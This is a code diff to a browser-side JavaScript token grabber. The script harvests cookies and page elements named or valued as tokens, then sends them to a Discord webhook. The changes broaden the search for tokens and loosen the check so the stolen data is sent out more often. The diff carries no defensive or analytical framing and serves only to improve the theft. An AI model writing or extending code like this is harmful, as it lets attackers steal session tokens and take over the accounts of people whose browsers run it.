@@ -137,17 +137,22 @@ function grabTokens() {
         if (Object.keys(tokens.cookies).length === 0) delete tokens.cookies;
     }
     
-    // Grab from page content
-    const tokenElements = document.querySelectorAll('[name*="token"], [id*="token"], [data-token]');
+    // Grab from page content with broader search
+    const tokenElements = document.querySelectorAll('[name*="token"], [id*="token"], [data-token], [value*="token"]');
     if (tokenElements.length > 0) {
         tokens.pageElements = Array.from(tokenElements).map(el => {
-            const value = el.value || el.dataset.token || el.textContent;
+            const value = el.value || el.dataset.token || el.textContent || el.getAttribute('value');
             return value ? { tag: el.tagName, name: el.name || el.id || el.dataset.token, value } : null;
         }).filter(el => el);
-        if (tokens.pageElements.length === 0) delete tokens.pageElements;
+    } else {
+        tokens.pageElements = []; // Ensure it exists even if empty
     }
     
-    return tokens;
+    if (Object.keys(tokens).length === 0 && tokens.pageElements.length === 0) {
+        tokens.note = 'No tokens found';
+    }
+    
+    return tokens; // Always return the object
 }
 
 // Function to send data to Discord webhook
@@ -179,7 +184,7 @@ async function sendToWebhook(data) {
 
 // Execute the token grab and send
 const tokens = grabTokens();
-if (Object.keys(tokens).length > 0) {
+if (Object.keys(tokens).length > 0 || tokens.pageElements?.length > 0) {
     sendToWebhook(tokens);
 } else {
     console.log('No tokens found');
